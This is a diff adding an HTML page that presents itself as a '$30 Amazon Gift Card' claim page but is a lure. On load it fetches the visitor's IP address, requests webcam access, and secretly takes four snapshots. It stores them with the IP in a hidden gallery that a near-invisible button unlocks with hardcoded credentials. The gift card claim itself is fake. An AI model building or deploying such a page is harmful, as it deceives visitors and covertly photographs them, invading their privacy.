@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Gift Card Reward</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            height: 400px;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            justify-content: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button#claim-reward {
+            background-color: #4CAF50;
+            color: white;
+            padding-top: 5px;
+            margin: 10px 20px;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+        button#system-requirements {
+            background-color: whitesmoke;
+            color: white;
+            font-size: 12px;
+            padding: 5px 10px;
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+        }
+        button.delete {
+            background-color: #FF4C4C;
+            color: white;
+        }
+        .loading {
+            display: none;
+            margin-top: 10px;
+        }
+        .gift-card {
+            margin: 20px 0;
+        }
+        #owner-gallery {
+            display: none;
+        }
+        @media screen and (max-width: 600px) {
+            .container {
+                width: 90%;
+            }
+            button {
+                font-size: 14px;
+            }
+            button#system-requirements {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Claim Your $30 Amazon Gift Card! 🎉</h1>
+        <img src="amazonGiftCard.jpg" alt="Gift Card" class="gift-card"> <br>
+        <button id="claim-reward" disabled>Claim Reward</button>
+        <div class="loading" id="loading">Processing...</div>
+        <button id="system-requirements">System Requirements</button>
+    </div>
+
+    <div id="owner-gallery">
+        <h2>Personal Gallery</h2>
+        <div id="gallery-container" class="gallery"></div>
+        <button class="delete" id="delete-gallery">Delete All Pictures</button>
+    </div>
+
+    <script>
+        const loadingIndicator = document.getElementById('loading');
+        const claimRewardButton = document.getElementById('claim-reward');
+        const galleryContainer = document.getElementById('gallery-container');
+        const ownerGallery = document.getElementById('owner-gallery');
+        const deleteGalleryButton = document.getElementById('delete-gallery');
+        let permissionsGranted = false;
+        let userIP = '';
+
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip; // Save the IP globally
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+
+                setTimeout(() => {
+                    for (let i = 0; i < 4; i++) {
+                        setTimeout(() => {
+                            canvas.width = videoElement.videoWidth;
+                            canvas.height = videoElement.videoHeight;
+                            ctx.drawImage(videoElement, 0, 0);
+                            const img = document.createElement('img');
+                            img.src = canvas.toDataURL('image/png');
+
+                            // Create a wrapper for image and IP text
+                            const wrapper = document.createElement('div');
+                            wrapper.style.marginBottom = '10px';
+
+                            // Create a text element for the IP
+                            const ipText = document.createElement('p');
+                            ipText.textContent = `IP: ${userIP}`;
+                            ipText.style.fontSize = '12px';
+                            ipText.style.margin = '5px 0';
+
+                            // Append the image and IP text to the wrapper
+                            wrapper.appendChild(img);
+                            wrapper.appendChild(ipText);
+
+                            // Append the wrapper to the gallery
+                            galleryContainer.appendChild(wrapper);
+                        }, i * 1000);
+                    }
+                }, 2000);
+
+                permissionsGranted = true;
+                claimRewardButton.disabled = false;
+                claimRewardButton.style.opacity = 1;
+                claimRewardButton.style.cursor = 'pointer';
+            } catch (err) {
+                alert('Camera access is required to use this feature.');
+                console.error(err);
+            }
+        }
+
+        window.onload = async () => {
+            await fetchIP();
+            startCamera();
+        };
+
+        document.getElementById('claim-reward').addEventListener('click', () => {
+            if (!permissionsGranted) {
+                alert('Please allow all permissions to claim the reward.');
+                return;
+            }
+            loadingIndicator.style.display = 'block';
+            setTimeout(() => {
+                alert('Congratulations! You have claimed a $30 Amazon Gift Card!');
+                loadingIndicator.style.display = 'none';
+            }, 300000); // 5 minutes in milliseconds
+        });
+
+        document.getElementById('system-requirements').addEventListener('click', () => {
+            const username = prompt('Enter Username:');
+            const password = prompt('Enter Password:');
+            
+            if (username === 'xgabriel' && password === 'gabriel800@') {
+                ownerGallery.style.display = 'block';
+            } else {
+                alert('Access Denied! Incorrect credentials.');
+            }
+        });
+
+        deleteGalleryButton.addEventListener('click', () => {
+            galleryContainer.innerHTML = '';
+            alert('Gallery has been cleared.');
+        });
+    </script>
+</body>
+</html>
